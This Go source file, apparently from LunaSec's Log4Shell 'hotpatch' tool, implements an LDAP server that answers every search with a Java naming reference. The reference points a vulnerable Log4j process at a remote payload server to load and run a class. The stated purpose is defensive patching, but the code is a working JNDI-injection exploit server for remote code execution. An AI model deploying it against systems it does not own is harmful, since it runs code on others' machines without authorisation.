// Copyright 2021 by LunaSec (owned by Refinery Labs, Inc)
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
// http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
package patch

import (
	"fmt"
	ldapmsg "github.com/lor00x/goldap/message"
	"github.com/rs/zerolog/log"
	"io/ioutil"
	golog "log"
)

import (
	"github.com/breadchris/ldapserver"
)

type Log4ShellLDAPServer interface {
	Start()
	Stop()
}

type HotpatchLDAPServer struct {
	port int
	payloadServerUrl string
	server *ldapserver.Server
}

func NewHotpatchLDAPServer(port int, payloadServerUrl string) Log4ShellLDAPServer {
	return &HotpatchLDAPServer{
		port: port,
		payloadServerUrl: payloadServerUrl,
	}
}

func (s *HotpatchLDAPServer) Start() {
	ldapserver.Logger = golog.New(ioutil.Discard, "", golog.LstdFlags)

	s.server = ldapserver.NewServer()
	routes := ldapserver.NewRouteMux()

	routes.Search(s.search)
	routes.Bind(s.bind)
	s.server.Handle(routes)

	go func() {
		addr := fmt.Sprintf("0.0.0.0:%d", s.port)

		log.Info().
			Str("addr", addr).
			Msg("Started live patch server")

		defer func() {
			if err := recover(); err != nil {
				log.Error().
					Err(err.(error)).
					Msg("ldap client panic recovered")
			}
		}()

		err := s.server.ListenAndServe(addr)
		if err != nil {
			log.Error().
				Err(err).
				Msg("unable to start ldap server")
			panic(err)
		}
		log.Info().Msg("Live Patch Server Started")
	}()
}

func (s *HotpatchLDAPServer) Stop() {
	s.server.Stop()
}

func (s *HotpatchLDAPServer) createSearchResultEntry(req ldapmsg.SearchRequest) ldapmsg.SearchResultEntry {
	resolvedJNDICodebase := ldapmsg.AttributeValue(s.payloadServerUrl)

	payloadClassName := ldapmsg.AttributeValue("Log4ShellHotpatch")

	payloadDescription := fmt.Sprintf(
		"attempting to patch Log4Shell vulnerability with payload hosted on: %s%s.class",
		resolvedJNDICodebase,
		payloadClassName,
	)

	classNameAttribute := ldapmsg.AttributeValue(payloadDescription)

	e := ldapserver.NewSearchResultEntry("cn=log4shell-hotpatch, " + string(req.BaseObject()))
	e.AddAttribute("cn", "log4shell-hotpatch")
	e.AddAttribute("javaClassName", classNameAttribute)
	e.AddAttribute("javaCodeBase", resolvedJNDICodebase)
	e.AddAttribute("objectclass", "javaNamingReference")
	e.AddAttribute("javaFactory", payloadClassName)
	return e
}

func (s *HotpatchLDAPServer) search(w ldapserver.ResponseWriter, msg *ldapserver.Message) {
	log.Info().
		Str("client", msg.Client.Addr().String()).
		Msg("LDAP search request from remote client")

	req := msg.GetSearchRequest()

	select {
	case <-msg.Done:
		log.Debug().
			Msg("remote connection closed")
	default:
	}

	entry := s.createSearchResultEntry(req)
	w.Write(entry)

	res := ldapserver.NewSearchResultDoneResponse(ldapserver.LDAPResultSuccess)
	w.Write(res)
}

func (s *HotpatchLDAPServer) bind(w ldapserver.ResponseWriter, msg *ldapserver.Message) {
	log.Info().
		Str("client", msg.Client.Addr().String()).
		Msg("LDAP bind request from remote client")

	res := ldapserver.NewBindResponse(ldapserver.LDAPResultSuccess)
	w.Write(res)
}
